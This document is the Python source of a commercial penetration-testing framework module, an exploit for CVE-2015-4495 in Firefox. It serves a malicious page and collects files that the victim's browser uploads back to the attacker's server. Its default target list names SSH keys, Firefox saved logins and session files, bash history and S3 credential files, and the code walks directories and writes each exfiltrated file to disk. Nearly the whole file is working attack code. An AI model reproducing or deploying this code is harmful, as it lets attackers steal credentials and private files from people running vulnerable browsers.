#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import errno
import sys
import json
import base64
import re
import fnmatch
import random
import urllib

if "." not in sys.path:
    sys.path.append(".")

from string import ascii_uppercase
from string import ascii_lowercase
from string import digits
from struct import pack

from exploitutils import *
from tcpexploit import *
from httpclientside import *
from libs.spkproxy import header, body
from urlparse import urlparse
from urlparse import parse_qs
from libs.canvasos import canvasos

import canvasengine


NAME                            = "firefox_pdfjs_filereader"
DESCRIPTION                     = "CVE-2015-4495 Firefox Arbitrary File / Directory Reader"

DOCUMENTATION                   = {}
DOCUMENTATION["VENDOR"]         = "Mozilla"
DOCUMENTATION['Date public']    = '08/06/2015'
DOCUMENTATION['CVE Name']       = 'CVE-2015-4495'
DOCUMENTATION['CVE Url']        = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4495'
DOCUMENTATION['References']     = 'https://www.mozilla.org/en-US/security/advisories/mfsa2015-78/'

VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Clientside'
PROPERTY['ARCH']                = [['Linux']]

# Number of times to re-try downloading a file
PROPERTY['RETRY_COUNT']         = 10

# Number of milliseconds to wait before polling for a
# new file to download. Larger files may require a longer
# timeout.
PROPERTY['EXFIL_TIMEOUT_MSECS'] = 7000

DOCUMENTATION["NOTES"]          = """
Tested on:
    Ubuntu 14.04.3 LTS
    Firefox 39.0

Under the Response tab of ClientD main window, the option "Respond directly with
exploit" must be selected. Modify PROPERTY['RETRY_COUNT'] to change the number
of times the exploit will try to download a given file. PROPERTY['EXFIL_TIMEOUT_MSECS']
is the number of milliseconds before the exploit server is polled for a new file. Any
file in the process of being exfiled by the client will be lost, which is why there are
retries.

NOTE:
"""

CHANGELOG = """
"""

def unfoil_path(path):
    parts = []

    prev_path = None
    current_path = path

    while True:
        prec_path, entry_name = os.path.split(current_path)

        # print "prec_path:%s, entry_name:%s"% (prec_path, entry_name)

        if prec_path == current_path:
            break
        else:
            if len(entry_name) != 0:
                parts.insert(0, entry_name)

            current_path = prec_path

    return parts

# Note: any rules that require lookahead, such as "**" are not allowed.
default_select_rules = ["/home/*/.ssh/**",
                        "/home/*/.mozilla/firefox/*/logins.json",
                        "/home/*/.mozilla/firefox/*/sessionstore.js",         # Open tabs / windows
                        "/home/*/.mozilla/firefox/*/sessionstore-backups/*.js*",

                        # These paths will not work due to the fact that they have
                        # mime type handlers that wo
                        # "/home/*/.config/google-chrome/Default/Login Data",   # Google Chrome / Chromium passwords
                        # "/home/*/.config/chromium/Default/Login Data",
                        # "/home/*/.mozilla/firefox/*/persdict.dat",          # dictionary words
                        # "/home/*/.mozilla/firefox/*/formhistory.sqlite",    # autocomplete history
                        # "/home/*/.mozilla/firefox/*/cookies.sqlite",        # cookies
                        # "/home/*/.mozilla/firefox/*/webappstore.sqlite",    # DOM storage - web
                        # "/home/*/.mozilla/firefox/*/chromeappstore.sqlite", # DOM storage - extensions
                        # "/home/*/.mozilla/firefox/*/cert8.db",              # Imported SSL certs
                        # "/home/*/.mozilla/firefox/*/pluginreg.dat",         # Plugin info

                        "/home/*/.bash_history",
                        "/home/*/.s3cfg",
]

default_avoid_rules = ["/home/**/*.xpi",
                       "/home/**/*.xml",
                       "/home/*/.ssh/*.pub",
                       "/home/**/*~",
]


class PosixFileBrowser(object):
    def __init__(self, select_rules=None, avoid_rules=None):
        global default_select_rules
        global default_avoid_rules

        if select_rules == None:
            select_rules = default_select_rules
        if avoid_rules == None:
            avoid_rules = default_avoid_rules

        # Assumption: we only have access to one users' home directory
        self.path_map = {"/home": ("dir", 0)}

        self.select_rules = [unfoil_path(path) for path in select_rules]

        self.avoid_rules = avoid_rules

        self.seen_paths = set([])

        self.retry_count = PROPERTY['RETRY_COUNT']


    def no_lookahead_required(self, rule):
        return "**" not in rule[:-1]

    def path_is_on_rule(self, path, rule):
        upath = unfoil_path(path)

        matched = True

        if self.no_lookahead_required(rule):
            for (path_elem, rule_elem) in zip(upath, rule):
                if rule_elem  == "*":
                    pass
                elif rule_elem == "**":
                    break
                else:
                    if not fnmatch.fnmatch(path_elem, rule_elem):
                        matched = False
                        break
        else:
            raise Exception("The ** glob is not supported due to the fact that it requires a lookahead decision")

        return matched

    def dump_state(self):
        # comment this out to enable logging
        return

        for path in self.seen_paths:
            logging.debug(">> already seen path:%s"% (path))

        print "-- in queue:"
        if len(self.path_map):
            for (path, (path_type, times_downloaded)) in self.path_map.iteritems():
                logging.debug(">> path %s of type %s, downloaded %s times"% (path, path_type, str(times_downloaded)))
        else:
            logging.debug(">> NO PATHS IN QUEUE")

    def add_path(self, path, path_type):
        path = os.path.abspath(path)

        if not path in self.seen_paths:
            if any([self.path_is_on_rule(path, rule) for rule in self.select_rules]):
                if not any([fnmatch.fnmatch(path, rule) for rule in self.avoid_rules]):
                    self.path_map[path] = (path_type, 0)

            self.seen_paths.add(path)

    def received_path_data(self, path):
        del self.path_map[path]

    def get_next_path(self):
        if len(self.path_map) > 0:
            current_path = random.choice(self.path_map.keys())

            (path_type, times_downloaded) = self.path_map[current_path]

            if times_downloaded > self.retry_count - 1 :
                del self.path_map[current_path]
            else:
                self.path_map[current_path] = (path_type, times_downloaded+1)

            return (current_path, path_type)
        else:
            return (None, None)

def mkdir_p(path):
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else:
            raise


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setInfo(DESCRIPTION)

        self.version = 0
        self.name = NAME

        self.is_running = False

        self.x64 = True
        self.handles_options = True

        self.browser = {}

        return

    def run(self):
        self.is_running = True

        return True

    def makesploit(self, clientheader, clientbody):
        logging.debug("Inside of makesploit")
        if not self.is_running:
            self.run()

        h = None
        b = None
        useragent = clientheader.getStrValue(['User-Agent'])
        header_dict = clientheader.getAllHeaders()
        body_dict = clientbody.getArgsDict()

        past_host = clientheader.URL[1:]
        if len(past_host) > 0:
            past_host = past_host[1:]

        fail_softly = False

        if clientheader.verb == "GET":
            logging.info("Serving GET request for: %s"% (clientheader.URL))

            query = parse_qs(past_host)
            session_id = None

            if "session_id" in query:
                session_id = query["session_id"][0]
                # logging.info("session id from query:%s"% (session_id))
            else:
                session_id = `random.randint(0, 100000)`

            browser = self.browser.setdefault(session_id, PosixFileBrowser())
            browser.dump_state()

            h, b = self.build_exploit_page(session_id, browser, header_dict, body_dict)
        elif clientheader.verb == "POST":
            body_dict = dict((key, base64.b64decode(urllib.unquote(value).decode('utf-8'))) for (key, value) in body_dict.iteritems())
            session_id = body_dict["session_id"]
            browser = self.browser[session_id]

            browser.dump_state()

            logging.info("Serving POST request for: %s for session %s"% (clientheader.URL, str(session_id)))

            h, b = self.handle_exfil(session_id, browser, header_dict, body_dict)
            fail_softly = True
        else:
            if not fail_softly:
                logging.error("Invalid request method (%s)" % clientheader.verb)
                h = header("SERVER")
                b = body()
                h.status = "404"
                h.msg = "Not Found"
                h.addHeader("Content-Type", "text/html")
                b.setBody("")

        if fail_softly:
            h = header("SERVER")
            b = body()
            h.status = "200"
            h.msg = ""
            h.addHeader("Content-Type", "text/html")
            b.setBody("")

        return h, b

    def handle_exfil(self, session_id, browser, header_dict, body_dict):
        h = header("SERVER")
        b = body()

        logging.debug("headers:%s"% (str(header_dict)))
        # logging.info("body:%s"% (body_dict))
        # logging.info("from ip:%s"% (self.target))

        if "file_path" in body_dict:
            browser.received_path_data(body_dict["file_path"])
            url = urlparse(body_dict["file_path"])

            base_output_path = os.path.abspath(self.output(ip=self.sessionstate.ip, subdir="ff_exfil"))
            output_path = os.path.abspath(base_output_path + "/" + url.path)

            if output_path.startswith(base_output_path):
                mkdir_p(os.path.dirname(output_path))

                logging.info("Writing %s to %s"% (url.path, output_path))

                with open(output_path, "wb") as handle:
                    handle.write(body_dict["file_data"])
                    logging.warning("Wrote target's %s to %s"% (url.path, output_path))

        elif "dir_listing" in body_dict:
            browser.received_path_data(body_dict["dir_path"])

            dir_listing = json.loads(body_dict.get("dir_listing", "[]"))

            # logging.info("dir_listing:%s"% (dir_listing))

            for entry in dir_listing:
                path      = "/" + urllib.unquote(entry[0].lstrip("file://"))
                path_type = entry[1]

                # logging.info("adding path:%s of type %s"% (path, path_type))
                browser.add_path(path, path_type)

        h.status = "200"
        h.msg = "Successfully uploaded"
        h.addHeader("Content-Type", "text/html")
        b.setBody("")

        return h, b

    def build_exploit_page(self, session_id, browser, header_dict, body_dict):
        # logging.info("Serving GET request %s"% (clientheader.URL))
        logging.info("Building exploit")

        # logging.info("header_dict:%s"% (str(header_dict)))

        h = header("SERVER")
        b = body()

        target_path, path_type = browser.get_next_path()
        # logging.info("self.browser.keys():%s"% (self.browser.keys()))
        logging.info("Downloading contents of path:%s of type:%s"% (target_path, path_type))

        if target_path != None:
            action = ("GET_DIRECTORY_LISTING" if (path_type == "dir") else "EXFIL_FILE")

            exploit_dir = os.path.dirname(__file__)
            exploit_html_path = os.path.join(exploit_dir, "Resources", "template.html")
            exploit_js_path = os.path.join(exploit_dir, "Resources", "template.js")

            exploit_html = None
            exploit_js = None

            with open(exploit_html_path, "r") as exploit_handle:
                exploit_html = exploit_handle.read()

            with open(exploit_js_path, "r") as exploit_handle:
                exploit_js = exploit_handle.read()

            host = header_dict["Host"][0]

            contents = exploit_html.replace("JAVASCRIPT_GOES_HERE", exploit_js)
            contents = contents.replace("CLIENTD_HOST",host)
            contents = contents.replace("CANVAS_ACTION", action)
            contents = contents.replace("TARGET_PATH", str(target_path))
            contents = contents.replace("SESSION_ID", session_id)
            contents = contents.replace("EXFIL_TIMEOUT_MSECS", str(PROPERTY['EXFIL_TIMEOUT_MSECS']))

            b.setBody(contents)

        h.addHeader("Content-Type", "text/html")

        return h, b

    def is_vulnerable(self, info_dict):
        logger.info("info_dict:%s"% (str(info_dict)))

        match = re.search(info_dict["user_agent"], "Firefox/(?P<version_id>[^\s]+)\s")
        if match:
            version = match.group("version_id")
            numbers = version.split(".")

            major_version = int(numbers[0])

            if major_version == 39:
                if len(numbers) <= 2:
                    return 1 if int(numbers[1]) == 0 else 0
                else:
                    return 1 if int(numbers[2]) < 3 else 0
            elif major_version < 39:
                return 1
            else:
                return 0
        else:
            return 0

        # return 1 if "Firefox/39.0" in info_dict["user_agent"] else 0


# For running the exploit on the command line
if __name__ == "__main__":
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
